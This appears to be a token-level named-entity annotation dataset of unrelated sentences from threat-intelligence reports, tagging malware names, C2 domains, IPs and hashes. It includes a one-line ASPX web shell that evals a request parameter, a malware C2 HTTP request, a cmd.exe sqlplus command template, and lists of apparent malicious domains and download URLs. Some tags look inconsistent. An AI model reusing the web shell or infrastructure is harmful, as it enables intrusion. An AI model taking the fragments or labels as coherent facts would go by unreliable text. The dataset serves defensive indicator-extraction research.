further	O
command	O
is	O
executed	O
using	O
the	O
same	O
credentials	O
,	O
to	O
create	O
a	O
scheduled	O
task	O
on	O
the	O
remote	O
device	O
with	O
the	O
name	O
'	O
BITSRAN	B-malware.drop
'	O
.	O

CryptoContainer	O
:	O
:cryptRc4	O
(	O
uchar	O
*	O
,	O
uint	O
,	O
uint	O
)	O
CryptoContainer	O
:	O
:decryptData	O
(	O
uchar	O
*	O
,	O
uint	O
,	O
uint	O
*	O
)	O

This	O
is	O
a	O
very	O
inconvenient	O
way	O
to	O
download	O
a	O
payload	O
from	O
the	O
Internet	O
,	O
but	O
it	O
is	O
useful	O
for	O
hiding	O
the	O
originating	O
process	O
for	O
network	O
activities	O
.	O

The	O
malware	O
executed	O
with	O
no	O
issues	O
except	O
on	O
Windows	O
7	O
.	O

GT446.ezua.COM	B-url.unknown
aunewsonline.com	B-url.unknown
avvmail.com	B-url.unknown
cas.ibooks.tk	B-url.unknown
cas.m-e.org.ru	B-url.unknown
colville.com	B-url.unknown
cvba.com	B-url.unknown
deebeedesigns.ca	B-url.unknown
dev.teamattire.com	B-url.unknown
doversolutions.co.in	B-url.unknown
download.epac.to	B-url.unknown
drgeorges.com	B-url.unknown
dril-quip.deltae.com.br	B-url.unknown
dsds.co.kr	B-url.unknown
[	O
REMOVED	B-url.unknown
]	I-url.unknown
.ruok.org	I-url.unknown
engineer.lflinkup.org	B-url.unknown
exactearth.info.tm	B-url.unknown
fbrshop.com	B-url.unknown
firebirdonline.com	B-url.unknown
forceoptions.net	B-url.unknown
freelanceindy.com	B-url.unknown
ftp.xmahone.ocry.com	B-url.unknown
garyhart.com	B-url.unknown
gobroadreach.com	B-url.unknown
hint.happyforever.com	B-url.unknown
hojutsu.com	B-url.unknown
imly.org	B-url.unknown
interradiology.com	B-url.unknown
jimnaugle.com	B-url.unknown
kayauto.net	B-url.unknown
keenathomas.com	B-url.unknown
ks.utworld.ch	B-url.unknown
mast.zyns.com	B-url.unknown
media.conci.com.au	B-url.unknown
media.finanstalk.ru	B-url.unknown
media.metdf.com.au	B-url.unknown
meeting.toh.info	B-url.unknown
mountainvalley.americanunfinished.com	B-url.unknown
mrswehrman.com	B-url.unknown
mwa.net	B-url.unknown
woodagency.com	B-url.unknown
worldnews.kickingdruging.toythieves.com	B-url.unknown
news.hqrls.com	B-url.unknown
odysseus.qs-va.orbcomm.net	B-url.unknown
ohb-technology.brgh.de	B-url.unknown
omegalogos.org	B-url.unknown
pastorsrest.com	B-url.unknown
portal.itsaol.com	B-url.unknown
progammerli.com	B-url.unknown
rbaparts.com	B-url.unknown
report.crabdance.com	B-url.unknown
[	O
REMOVED	B-url.unknown
]	I-url.unknown
.photo-frame.com	I-url.unknown
route.cisco.ns01.info	B-url.unknown
shunleewest.com	B-url.unknown
slowblog.com	B-url.unknown
smilecare.com	B-url.unknown
software.myftp.info	B-url.unknown
soko.com	B-url.unknown
tcw.homier.com	B-url.unknown
[	O
REMOVED	B-url.unknown
]	I-url.unknown
comminc.us.to	I-url.unknown
[	O
REMOVED	B-url.unknown
]	I-url.unknown
.arnotex.com	I-url.unknown
thecrownsgolf.org	B-url.unknown
[	O
REMOVED	B-url.unknown
]	I-url.unknown
.alfalcons.com	I-url.unknown
twocirclesmusic.com	B-url.unknown
un.linuxd.org	B-url.unknown
update.sektori.org	B-url.unknown
us.gnpes.org	B-url.unknown
vwrm.com	B-url.unknown

ST	O
/2C/H.htm	O
HTTP/1.1	O
Cookie	O
:	O
uQ=	O
[	O
REDACTED	O
]	O
;	O
omWwFSA=hw4biTXvqd%2FhK2TIyoLYj1	O
%	O
2FShw6MhEGHlWurHsUyekeuunmop4kZ	O
;	O
Tgnfm5E=RPBaxi%2Bf4B2r6CTd9jh5u3AHOwuyVaJeuw	O
%	O
3D	O
%	O
3D	O
Accept	O
:	O
*/*	O
User-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
7.0	O
;	O
Windows	O
NT	O
5.1	O
;	O
Trident/4.0	O
;	O
.NET	O
CLR	O
2.0.50727	O
;	O
.NET	O
CLR	O
3.0.4506.2152	O
;	O
.NET	O
CLR	O
3.5.30729	O
;	O
.NET	O
CLR	O
1.1.4322	O
)	O
Host	O
:	O
kawasaki.unhamj(.)com	B-url.cncsvr
Content-Length	O
:	O
0	O
Connection	O
:	O
Keep-Alive	O
Cache-Control	O
:	O
no-cache	O

cmd.exe	O
/c	O
echo	O
exit	O
|	O
sqlplus	O
-S	O
/	O
as	O
sysdba	O
@	O
[	O
SQL_Statements	O
]	O
>	O
[	O
OUTPUT_FILE	O
]	O

'	O
Kraken	B-malware.ransom
HTTP	I-malware.ransom
'	O
was	O
said	O
to	O
be	O
used	O
during	O
an	O
espionage	O
campaign	O
against	O
the	O
energy	O
sector	O
,	O
especially	O
against	O
targets	O
in	O
the	O
UAE	O
.	O

All	O
rights	O
reserved	O
.	O

If	O
the	O
check	O
is	O
unsuccessful	O
,	O
then	O
the	O
server	O
variant	O
terminates	O
.	O

We	O
are	O
releasing	O
this	O
data	O
to	O
help	O
victims	O
identify	O
and	O
remediate	O
the	O
threat	O
.	O

[	O
C	O
&	O
C_server	O
]	O
/al	O
?	O

link	O
lizamoon	O

Chafer	O
,	O
the	O
Iran-based	O
targeted	O
attack	O
group	O
,	O
mounted	O
further	O
operations	O
throughout	O
2017	O
,	O
attacking	O
more	O
organizations	O
in	O
the	O
Middle	O
East	O
and	O
beyond	O
,	O
and	O
deploying	O
several	O
new	O
tools	O
.	O

2016	O
.	O

In	O
our	O
next	O
post	O
,	O
we	O
will	O
discuss	O
techniques	O
for	O
identifying	O
web	O
shells	B-malware.backdoor
.	O

We	O
identified	O
two	O
kinds	O
of	O
'	O
encrypted	O
'	O
data	O
:	O
Some	O
paths	O
are	O
encoded	O
using	O
base64	O
algorithm	O
,	O
such	O
as	O
:	O
JVdJTkRJUiUA	O
(	O
%	O
WINDIR	O
%	O
)	O
and	O
JWFwcGRhdGElaa==	O
(	O
%	O
appdata	O
%	O
)	O
Some	O
data	O
is	O
encrypted	O
(	O
RC4	O
)	O
,	O
such	O
as	O
the	O
C	O
&	O
C	O
information	O
:	O
The	O
Bitcoin	O
monitor	O
plugin	O
is	O
even	O
more	O
amusing	O
.	O

Where	O
k	O
:	O
is	O
a	O
unique	O
identifier	O
for	O
the	O
victim	O
,	O
s	O
:	O
is	O
a	O
campaign	O
identifier	O
included	O
in	O
the	O
backdoor	O
,	O
h	O
:	O
is	O
the	O
hostname	O
of	O
the	O
victim	O
computer	O
,	O
u	O
:	O
is	O
the	O
victim	O
user	O
,	O
o	O
:	O
is	O
the	O
operating	O
system	O
and	O
service	O
pack	O
level	O
,	O
and	O
m	O
is	O
the	O
mac	O
address	O
.	O

As	O
mentioned	O
earlier	O
,	O
the	O
backdoor	O
also	O
contains	O
a	O
library	O
called	O
HTTPprov	O
.	O

SHA1	O
SHA256	O
c22792dbf9a0279b36fa22f775a92ddfea9545cc842381ba84c2402c76aa393a	B-hash
SHA512	O
0b064bad3a237734cf74f587a573a79949c79f8922df444ac7d73474d5cab739b495036624a3b907	B-hash

mail.bg	O
)	O
.	O

The	O
chat	O
application	O
the	O
women	O
referred	O
him	O
to	O
was	O
spyware	O
,	O
disguised	O
as	O
the	O
Kik	B-malware.drop
Messenger	I-malware.drop
app	O
,	O
distributed	O
through	O
a	O
very	O
convincing	O
fake	O
site	O
.	O

d08f1211fe0138134e822e31a47ec5d4	B-hash
b27881f59c8d8cc529fa80a58709db36	B-hash
3c9e71400b72cc0213c9c3e4ab4df9df	B-hash
0edbad9e6041d43f97c7369439a40138	B-hash
97aaf130cfa251e5207ea74b2558293d	B-hash
62217af0299d6e241778adb849fd2823	B-hash
0dd7da89b7d1fe97e669f8b4156067c8	B-hash
61075faba222f97d3367866793f0907b	B-hash

MD5	O
Hashes	O

The	O
PDF	O
document	O
from	O
the	O
spearphishing	O
email	O
entices	O
the	O
victim	O
to	O
download	O
a	O
fake	O
update	O
to	O
acrobat	O
.	O

A	O
173.194.70.101	B-ip.unknown

The	O
threat	O
posed	O
by	O
ZxShell	B-malware.backdoor
to	O
organizations	O
is	O
one	O
that	O
can	O
not	O
be	O
ignored	O
.	O

It	O
allows	O
a	O
remote	O
attacker	O
to	O
take	O
full	O
control	O
of	O
the	O
system	O
,	O
spy	O
on	O
the	O
victims	O
and	O
exfi	O
ltrate	O
confi	O
dential	O
information	O
easily	O
.	O

The	O
shared	O
TTPs	O
include	O
:	O
•	O
Usage	O
of	O
the	O
same	O
custom	O
backdoors	O
and	O
RATs	B-malware.backdoor
such	O
as	O
CT/NewCT/NewCT2	O
,	O
Mongall	O
,	O
Nflog	B-malware.backdoor
,	O
as	O
well	O
as	O
off-the-shelf	O
RATs	B-malware.backdoor
such	O
as	O
PoisonIvy	O
,	O
to	O
maintain	O
access	O
to	O
the	O
victims	O
'	O
networks	O
.	O

CAPABILITY	O

Hussarini	B-malware.backdoor
export	O
functions	O
While	O
the	O
original	O
Outllib.dll	O
also	O
has	O
some	O
of	O
the	O
functions	O
above	O
,	O
notice	O
that	O
this	O
backdoor	O
has	O
a	O
lot	O
more	O
exported	O
functions	O
than	O
just	O
the	O
backdoor	O
DLL	O
.	O

The	O
resulting	O
(	O
encrypted	O
)	O
HTTP	O
request	O
is	O
then	O
sent	O
on	O
its	O
merry	O
way	O
to	O
the	O
DDoS	O
target	O
via	O
the	O
send	O
(	O
)	O
API	O
call	O
at	O
instruction	O
0x0049399D	O
.	O

<	O
%	O
@	O
Page	O
Language='Jscript	O
'	O
%	O
>	O
<	O
%	O
eval	O
(	O
Request.Item	O
[	O
'	O
password	O
'	O
]	O
,	O
'	O
unsafe	O
'	O
)	O
;	O
%	O
>	O

–	O
RPT.CCWS.EN-US.112013	O

Conclusion	O

•	O
Mtx	O
•	O
qdfrty	O
•	O
AgentMutex	O

/usr/lib/libng/ftpChecker.py	O
/usr/bin/nmap/	O
/usr/lib/libng/dirsearch/	O
/usr/share/python2.7	O
/dirsearch/	O
/usr/lib/libng/SMBT	O
rap/	O
/usr/lib/libng/commix/	O
/usr/lib/libng/subbrute-master/	O
/usr/share/python2.7	O
/sqlmap/	O
/usr/lib/libng/sqlmap-dev/	O
/usr/lib/libng/wpscan/	O
/usr/share/python2.7	O
/wpscan/	O
/usr/share/python2.7	O
/Sublist3r/	O
*Note	O
that	O
these	O
tools	O
can	O
also	O
be	O
used	O
by	O
other	O
threat	O
actors	O
.	O

Figure	O
8	O
:	O

Delete	O
itself	O
,	O
the	O
RAT	B-malware.backdoor
Installer	O
file	O
,	O
Center111940519.exe	O
3	O
.	O

For	O
example	O
,	O
XOR	O
decoding	O
the	O
binary	O
reveals	O
the	O
following	O
two	O
interesting	O
strings	O
:	O
%	O
ProgramFiles	O
%	O
\Internet	O
Explorer\iexplore.exe	O
\GppiTEMms.lnk	O
As	O
opposed	O
to	O
the	O
original	O
DLL	O
by	O
ALYac	O
,	O
which	O
typically	O
has	O
15	O
exports	O
,	O
the	O
analyzed	O
sample	O
has	O
the	O
following	O
20	O
exports	O
:	O

Keith	O
Tyler	O
provides	O
the	O
following	O
basic	O
IDS	O
signature	O
in	O
his	O
previously	O
cited	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
blog	O
post	O
:	O

In	O
this	O
particular	O
case	O
,	O
the	O
attacker	O
used	O
XtremeRAT	B-malware.backdoor
2.9	I-malware.backdoor
within	O
a	O
self-extracting	O
archive	O
that	O
also	O
presents	O
a	O
decoy	O
document	O
to	O
the	O
victim	O
,	O
where	O
the	O
decoy	O
content	O
appears	O
to	O
have	O
been	O
copied	O
from	O
a	O
website	O
.	O

In	O
2015	O
,	O
leaks	O
of	O
conversations	O
involving	O
Hacking	O
Team	O
revealed	O
that	O
zero-day	O
exploits	O
for	O
Adobe	B-malware.drop
Flash	I-malware.drop
were	O
being	O
sold	O
for	O
$	O
30k-	O
$	O
45k	O
per	O
exploit	O
.	O

Attack	O
Option	O
1	O
:	O
Use	O
the	O
SIS	O
to	O
shutdown	O
the	O
process	O

This	O
is	O
used	O
to	O
try	O
and	O
thwart	O
analysis	O
in	O
virtual	O
environments	O
.	O

iis	O
:	O
//	O
-	O
If	O
this	O
appears	O
in	O
unlabeled	O
textbox1	O
,	O
the	O
code	O
will	O
use	O
data	O
from	O
the	O
second	O
unlabeled	O
textbox2	O
to	O
execute	O
Active	O
Directory	O
requests	O
.	O

4	O
.	O

By	O
leveraging	O
Cisco	O
Umbrella	O
and	O
using	O
the	O
Investigate	O
tool	O
,	O
we	O
were	O
able	O
to	O
determine	O
that	O
across	O
all	O
of	O
the	O
C2	O
domains	O
listed	O
,	O
we	O
saw	O
a	O
large	O
influx	O
of	O
traffic	O
originating	O
from	O
India	O
,	O
as	O
evidenced	O
by	O
the	O
National	O
CERT	O
,	O
all	O
of	O
the	O
C2	O
domains	O
were	O
at	O
least	O
50	O
percent	O
requested	O
by	O
Indian	O
IP	O
infrastructure	O
.	O

The	O
Cybersecurity	O
Framework	O
(	O
Framework	O
)	O
,	O
developed	O
by	O
the	O
National	O
Institute	O
of	O
Standards	O
and	O
Technology	O
(	O
NIST	O
)	O
in	O
collaboration	O
with	O
the	O
public	O
and	O
private	O
sectors	O
,	O
is	O
a	O
tool	O
that	O
can	O
improve	O
the	O
cybersecurity	O
readiness	O
of	O
entities	O
.	O

The	O
fact	O
that	O
the	O
attackers	O
chose	O
to	O
develop	O
their	O
own	O
dropper	O
may	O
be	O
indicative	O
that	O
their	O
biggest	O
problem	O
when	O
conducting	O
network	O
intrusions	O
is	O
getting	O
their	O
foot	O
in	O
the	O
door	O
–	O
particularly	O
as	O
it	O
seems	O
as	O
though	O
they	O
still	O
prefer	O
the	O
more	O
fully	O
featured	O
Poison	O
Ivy	O
and	O
Xtreme	O
RAT	O
backdoors	O
as	O
2	O
stage	O
malware	O
families	O
.	O

This	O
is	O
not	O
the	O
first	O
time	O
and	O
surely	O
will	O
not	O
be	O
the	O
last	O
time	O
that	O
those	O
in	O
favor	O
of	O
democracy	O
in	O
Hong	O
Kong	O
will	O
be	O
targeted	O
.	O

Similar	O
to	O
jmidebs	O
,	O
4	O
more	O
functions	O
added	O
7061	O
Different	O
compilation	O
dates	O

The	O
malware	O
system	O
consists	O
of	O
at	O
least	O
two	O
Portable	O
Executable	O
(	O
PE	O
)	O
files	O
,	O
one	O
acting	O
as	O
a	O
headquarters	O
component	O
and	O
one	O
acting	O
as	O
field	O
unit	O
or	O
agent	O
component	O
.	O

Unfortunately	O
with	O
the	O
level	O
of	O
access	O
and	O
infrastructure	O
the	O
attackers	O
appear	O
to	O
have	O
,	O
this	O
is	O
quite	O
an	O
uphill	O
battle	O
.	O

The	O
Derusbi	B-malware.backdoor
server	O
variant	O
will	O
select	O
an	O
available	O
,	O
random	O
port	O
between	O
the	O
range	O
of	O
40,000	O
and	O
45,000	O
on	O
the	O
victim	O
's	O
machine	O
upon	O
which	O
to	O
listen	O
.	O

KOMPROGO	O
SOUNDBITE	O
PHOREAL	O
Command	O
and	O
control	O
(	O
C2	O
)	O
communications	O
via	O
TCP	O
raw	O
sockets	O
Four	O
configured	O
C2s	O
and	O
six	O
configured	O
ports	O
–	O
randomly-chosen	O
C2/port	O
for	O
communications	O
Registry	O
manipulation	O
Get	O
the	O
current	O
module	O
's	O
file	O
name	O
Gather	O
system	O
information	O
including	O
registry	O
values	O
,	O
user	O
name	O
,	O
computer	O
name	O
,	O
and	O
current	O
code	O
page	O
File	O
system	O
interaction	O
including	O
directory	O
creation	O
,	O
file	O
deletion	O
,	O
reading	O
,	O
and	O
writing	O
files	O
Load	O
additional	O
modules	O
and	O
execute	O
code	O
Terminate	O
processes	O
Anti-disassembly	O
Fully-featured	O
backdoor	O
capable	O
of	O
process	O
,	O
file	O
,	O
and	O
registry	O
management	O
Creating	O
a	O
reverse	O
shell	O
File	O
transfers	O
Running	O
WMI	O
queries	O
Retrieving	O
information	O
about	O
the	O
infected	O
system	O
C2	O
communications	O
via	O
DNS	O
Process	O
creation	O
File	O
upload	O
Shell	O
command	O
execution	O
File	O
and	O
directory	O
enumeration/manipulation	O
Window	O
enumeration	O
Registry	O
manipulation	O
System	O
information	O
gathering	O
C2	O
communications	O
via	O
ICMP	O
Reverse	O
shell	O
creation	O
Filesystem	O
manipulation	O
Registry	O
manipulation	O
Process	O
creation	O
File	O
upload	O
BEACON	O
(	O
Cobalt	O
Strike	O
)	O
Publicly	O
available	O
payload	O
that	O
can	O
inject	O
and	O
execute	O
arbitrary	O
code	O
into	O
processes	O
Impersonating	O
the	O
security	O
context	O
of	O
users	O
Importing	O
Kerberos	O
tickets	O
Uploading	O
and	O
downloading	O
files	O
Executing	O
shell	O
commands	O
Configured	O
with	O
malleable	O
C2	O
profiles	O
to	O
blend	O
in	O
with	O
normal	O
network	O
traffic	O
Co-deployment	O
and	O
interoperability	O
with	O
Metasploit	O
framework	O
SMB	O
Named	O
Pipe	O
in-memory	O
backdoor	O
payload	O
that	O
enables	O
peer-to-peer	O
C2	O
and	O
pivoting	O
over	O
SMB	O
Table	O
3	O
:	O
APT32	B-malware.infosteal
Malware	O
and	O
Capabilities	O
APT32	B-malware.infosteal
operators	O
appear	O
to	O
be	O
well-resourced	O
and	O
supported	O
as	O
they	O
use	O
a	O
large	O
set	O
of	O
domains	O
and	O
IP	O
addresses	O
as	O
command	O
and	O
control	O
infrastructure	O
.	O

It	O
encodes	O
outbound	O
web	O
traffic	O
.	O

The	O
graph	O
below	O
shows	O
the	O
links	O
between	O
the	O
we11point.com	B-url.unknown
domain	O
name	O
,	O
and	O
news.foundationssl[.]com	B-url.unknown
as	O
seen	O
on	O
the	O
CrowdStrike	O
blogpost	O
:	O
The	O
Krebs	O
article	O
also	O
points	O
toward	O
other	O
possible	O
(	O
although	O
not	O
explicit	O
)	O
links	O
between	O
the	O
domain	O
allegedly	O
used	O
in	O
the	O
Anthem	O
hack	O
(	O
we11point.com	B-url.unknown
)	O
to	O
Cluster	O
2	O
through	O
shared	O
WHOIS	B-url.normal
details	O
,	O
as	O
we11point.com	B-url.unknown
was	O
registered	O
by	O
domain	O
re-seller	O
'	O
li2384826402@yahoo.com	O
'	O
On	O
its	O
own	O
,	O
this	O
would	O
not	O
be	O
sufficient	O
to	O
associate	O
the	O
two	O
clusters	O
,	O
but	O
it	O
is	O
useful	O
to	O
note	O
as	O
a	O
'	O
softer	O
'	O
overlap	O
.	O

S	O
:	O
KeepAlive	O
|	O
27160288	O

The	O
function	O
call	O
location	O
is	O
represented	O
by	O
the	O
textual	O
values	O
shown	O
in	O
the	O
table	O
below	O
and	O
is	O
selected	O
using	O
a	O
switch	O
case	O
statement	O
as	O
shown	O
in	O
Figure	O
12	O
.	O

426KB	O
EXE	O
Encrypted	O
strings	O

Outcome	O

The	O
following	O
is	O
the	O
view	O
of	O
the	O
wiped	O
disk	O
for	O
each	O
of	O
the	O
operating	O
systems	O
that	O
we	O
tested	O
:	O
Figure	O
1	O
was	O
found	O
at	O
the	O
MBR	O
(	O
Sector	O
0	O
)	O
and	O
the	O
VBR	O
(	O
Sector	O
63/56	O
(	O
XP	O
,	O
2003	O
)	O
,	O
and	O
2048/206848	O
(	O
7	O
)	O
)	O
of	O
each	O
of	O
the	O
operating	O
systems	O
(	O
As	O
well	O
as	O
throughout	O
the	O
drive	O
)	O
.	O

Evidence	O
of	O
intrusion	O
within	O
client	O
networks	O
pointed	O
to	O
a	O
specific	O
server	O
,	O
CARBON2U.COM	B-url.cncsvr
,	O
that	O
had	O
been	O
previously	O
linked	O
to	O
malicious	O
activity	O
and	O
identified	O
by	O
other	O
security	O
firms	O
as	O
part	O
of	O
the	O
infrastructure	O
utilized	O
by	O
the	O
Sofacy	O
group	O
.	O

XtremeRat	B-malware.backdoor
is	O
a	O
commercially	O
available	O
backdoor	O
trojan	O
which	O
has	O
been	O
used	O
in	O
many	O
attacks	O
,	O
targeted	O
and	O
otherwise	O
,	O
over	O
the	O
years	O
.	O

Afterwards	O
,	O
Shellcode	O
will	O
be	O
running	O
to	O
send	O
several	O
requests	O
to	O
get	O
payload	O
from	O
remote	O
servers	O
.	O

The	O
'	O
Accept-Language	O
'	O
and	O
'	O
User-Agent	O
'	O
in	O
HTTP	O
headers	O
may	O
also	O
be	O
useful	O
to	O
whitelist	O
known	O
victim	O
locales	O
and	O
victim	O
environments	O
or	O
blacklist	O
security	O
products	O
with	O
non-standard	O
or	O
outdated	O
responses	O
.	O

We	O
can	O
not	O
confirm	O
this	O
certificate	O
actually	O
belonged	O
to	O
WindySoft	O
at	O
any	O
point	O
in	O
time	O
,	O
however	O
,	O
there	O
is	O
fairly	O
established	O
precedent	O
of	O
certificates	O
from	O
online	O
gaming	O
companies	O
being	O
used	O
to	O
digitally	O
sign	O
malware	O
and	O
attack	O
tools	O
.	O

This	O
motivation	O
bred	O
government	O
mistrust	O
,	O
as	O
the	O
Islamic	O
Republic	O
feared	O
that	O
the	O
financially	O
motivated	O
could	O
be	O
bought	O
by	O
foreign	O
intelligence	O
services	O
.	O

2017	O
.	O

More	O
frequently	O
,	O
however	O
,	O
many	O
are	O
now	O
identifying	O
that	O
distinct	O
groups	O
of	O
attackers	O
are	O
sharing	O
their	O
toolsets	O
,	O
just	O
as	O
in	O
the	O
cybercrime	O
world	O
.	O

Key	O
Logging	O

NOTE	O
:	O
'	O
BBHOBDDH	O
'	O
is	O
the	O
SWIFT	O
code	O
for	O
the	O
Bangladesh	O
Bank	O
in	O
Dhaka	O
.	O

29	O
Dec	O
.	O

Despite	O
assertions	O
that	O
it	O
is	O
the	O
work	O
of	O
amateurs	O
,	O
it	O
has	O
had	O
a	O
major	O
impact	O
on	O
companies	O
believed	O
to	O
have	O
been	O
affected	O
.	O

Cobalt	O
Strike2.0	O
Cobalt	O
Strike2.1	O
Cobalt	O
Strike2.2	O
C	O
&	O
C	O
of	O
plasticity	O
,	O
adding	O
option	O
'	O
veil	O
'	O
to	O
the	O
payload	O
generator	O
.	O

The	O
boot	O
sector	O
takes	O
up	O
1	O
sector	O
on	O
the	O
drive	O
;	O
the	O
next	O
6	O
sectors	O
on	O
the	O
drive	O
are	O
allocated	O
for	O
the	O
bootstrap	O
code	O
.	O

The	O
New	O
York	O
Times	O
.	O

This	O
malware	O
employs	O
several	O
interesting	O
evasion	O
techniques	O
.	O

We	O
are	O
unable	O
to	O
associate	O
IRONGATE	B-malware.backdoor
with	O
any	O
campaigns	O
or	O
threat	O
actors	O
.	O

The	O
malware	O
registers	O
itself	O
as	O
a	O
service	O
and	O
operates	O
within	O
an	O
environment	O
running	O
SWIFT	O
's	O
Alliance	O
software	O
suite	O
,	O
powered	O
by	O
an	O
Oracle	O
Database	O
.	O

Restrict	O
users	O
'	O
ability	O
(	O
permissions	O
)	O
to	O
install	O
and	O
run	O
unwanted	O
software	O
applications	O
,	O
and	O
apply	O
the	O
principle	O
of	O
'	O
Least	O
Privilege	O
'	O
to	O
all	O
systems	O
and	O
services	O
.	O

In	O
addition	O
to	O
obfuscation	O
techniques	O
,	O
it	O
also	O
has	O
the	O
ability	O
to	O
detect	O
security	O
tools	O
on	O
the	O
analysis	O
machine	O
,	O
and	O
can	O
also	O
shut	O
down	O
the	O
system	O
if	O
it	O
detects	O
the	O
presence	O
of	O
such	O
tools	O
.	O

The	O
retrieved	O
information	O
is	O
compressed	O
using	O
bzip2	O
,	O
encrypted	O
with	O
AES	O
and	O
then	O
encoded	O
using	O
Base64	O
before	O
being	O
transmitted	O
to	O
the	O
C	O
&	O
C	O
server	O
.	O

This	O
was	O
an	O
interesting	O
development	O
–	O
Israel	O
has	O
,	O
as	O
far	O
as	O
we	O
know	O
,	O
not	O
been	O
very	O
targeted	O
by	O
spear	O
phishing	O
attacks	O
like	O
this	O
.	O

2016	O
.	O

The	O
LNK	O
files	O
,	O
when	O
opened	O
,	O
would	O
execute	O
a	O
PowerShell	O
command	O
via	O
'	O
cmd.exe	O
/c	O
'	O
to	O
download	O
and	O
execute	O
an	O
additional	O
payload	O
.	O

A	O
second	O
host	O
within	O
the	O
same	O
199.91.173[.]40/29	B-ip.unknown
subnet	O
was	O
also	O
identified	O
hosting	O
similar	O
zipped	O
malware	O
at	O
http[:]//199.91.173[.]45/OBL_Leaked_Report.zip	B-ip.unknown
and	O
http[:]//199.91.173[.]45/Naxalites_Funded_By_Pakistan.zip	B-ip.unknown
.	O

It	O
checks	O
many	O
different	O
security	O
products	O
and	O
user-installed	O
programs	O
that	O
are	O
bound	O
to	O
specific	O
geolocations	O
and	O
cultures	O
.	O

In	O
reality	O
,	O
these	O
records	O
are	O
only	O
partially	O
encrypted	O
:	O
if	O
the	O
record	O
's	O
length	O
is	O
not	O
a	O
multiple	O
of	O
16	O
bytes	O
(	O
the	O
AES	O
block	O
size	O
)	O
,	O
then	O
the	O
remainder	O
of	O
the	O
bytes	O
are	O
written	O
to	O
the	O
file	O
unencrypted	O
.	O

However	O
,	O
evidence	O
of	O
any	O
of	O
the	O
files	O
involved	O
(	O
MD5	O
,	O
strings	O
,	O
file	O
names	O
)	O
traversing	O
the	O
network	O
,	O
e.g.	O
,	O
on	O
the	O
move	O
,	O
may	O
be	O
indicative	O
of	O
netsat.exe	B-malware.infosteal
,	O
et	O
al	O
presence	O
.	O

A	O
relevant	O
and	O
likely	O
counterargument	O
for	O
this	O
theory	O
,	O
however	O
,	O
is	O
that	O
Russian	O
forces	O
likely	O
have	O
employed	O
fire	O
support	O
systems	O
and	O
other	O
technologies	O
that	O
can	O
already	O
calculate	O
targeting	O
data	O
,	O
negating	O
the	O
need	O
for	O
an	O
application	O
to	O
perform	O
this	O
task	O
.	O

Note	O
the	O
same	O
User-Agent	O
'	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
6.0	O
;	O
Windows	O
NT	O
5.0	O
;	O
.NET	O
CLR	O
1.1.4322	O
)	O
'	O
is	O
used	O
by	O
both	O
the	O
older	O
and	O
newer	O
version	O
of	O
'	O
Nflog	B-malware.backdoor
'	O
samples	O
.	O

Command	O
execution	O
module	O
Password	O
stealer	O
module	O
NTLM	O
stealer	O
module	O
System	O
info	O
module	O
Screenshot	O
module	O

We	O
have	O
now	O
identified	O
a	O
specific	O
target	O
from	O
this	O
geographical	O
region	O
and	O
have	O
obtained	O
one	O
of	O
the	O
spear	O
phishing	O
emails	O
used	O
.	O

(	O
//TWITTER.COM/INTENT/TWEET	O
?	O

Guccifer	O
2.0	O
continued	O
to	O
leak	O
batches	O
of	O
DNC	O
documents	O
through	O
September	O
.	O

After	O
sending	O
,	O
the	O
malware	O
executes	O
the	O
real	O
Hangul	O
word	O
processing	O
application	O
'	O
Hwp.exe	O
'	O
to	O
open	O
the	O
.HWP	O
document	O
as	O
the	O
user	O
intended	O
.	O

A	O
second	O
scheduled	O
task	O
named	O
'	O
Scheduled	O
Defrags	O
'	O
was	O
created	O
by	O
loading	O
the	O
raw	O
task	O
XML	O
with	O
a	O
backdated	O
task	O
creation	O
timestamp	O
of	O
June	O
2	O
,	O
2016	O
.	O

However	O
,	O
the	O
attackers	O
should	O
not	O
be	O
considered	O
script-kiddies	O
.	O

This	O
includes	O
an	O
output	O
of	O
the	O

First	O
,	O
it	O
assigns	O
EBX	O
the	O
value	O
0xFFFFFF8F	O
,	O
or	O
-71	O
.	O

We	O
provide	O
the	O
active	O
intelligence	O
that	O
is	O
critical	O
to	O
understanding	O
the	O
intent	O
of	O
the	O
threat	O
,	O
the	O
traits	O
associated	O
with	O
the	O
malware	O
and	O
information	O
that	O
will	O
help	O
make	O
your	O
existing	O
investment	O
in	O
your	O
security	O
infrastructure	O
more	O
valuable	O
.	O

(	O
d020b08f5a6aef1f1072133d11f919f8	B-hash
)	O
One	O
of	O
the	O
above	O
mentioned	O
malicious	O
URLs	O
was	O
spread	O
via	O
comments	O
by	O
a	O
fake	O
Facebook	O
profile	O
–	O
Linda	O
Santos	O
(	O
no	O
longer	O
available	O
)	O
:	O
In	O
September	O
2016	O
,	O
the	O
fake	O
profile	O
commented	O
to	O
posts	O
by	O
Israel	O
Electric	O
Company	O
:	O
The	O
profile	O
had	O
dozens	O
of	O
friends	O
,	O
almost	O
all	O
were	O
IEC	O
employees	O
:	O
The	O
fake	O
profile	O
was	O
following	O
only	O
three	O
pages	O
,	O
one	O
of	O
which	O
was	O
the	O
IEC	O
official	O
page	O
:	O
In	O
July	O
2016	O
,	O
when	O
mobile	O
game	O
'	O
Pokemon	O
Go	O
'	O
was	O
at	O
the	O
peak	O
of	O
its	O
popularity	O
,	O
the	O
attackers	O
created	O
a	O
Facebook	O
page	O
impersonating	O
the	O
official	O
Pokemon	O
Go	O
page	O
:	O
The	O
page	O
,	O
which	O
is	O
no	O
longer	O
available	O
,	O
had	O
about	O
one	O
hundred	O
followers	O
–	O
most	O
were	O
Arab	O
Israelis	O
and	O
some	O
were	O
Jewish	O
Israelis	O
.	O

The	O
domain	O
www.ndbssh[.]com	B-url.unknown
resolved	O
to	O

移动端技术	O
(	O
17	O
)	O

Lazarus	O
'	O
backend	O
logs	O
also	O
record	O
victim	O
IP	O
addresses	O
.	O

It	O
is	O
also	O
worth	O
noting	O
that	O
this	O
is	O
not	O
the	O
first	O
time	O
that	O
the	O
DPHK	O
website	O
has	O
been	O
used	O
in	O
a	O
strategic	O
web	O
compromise	O
.	O

<	O
Module	O
>	O
.....	O
|	O
<	O
snip	O
>	O
0000d6d0	O
04	O
00	O
56	O
61	O
6c	O
75	O
65	O
54	O
79	O
70	O
65	O
00	O
05	O
00	O
44	O
61	O
|	O
..ValueType	O
...	O
|	O
Da	O
|	O
0000d6e0	O
74	O
61	O
00	O
53	O
68	O
61	O
64	O
6f	O
77	O
54	O
65	O
63	O
68	O
5f	O
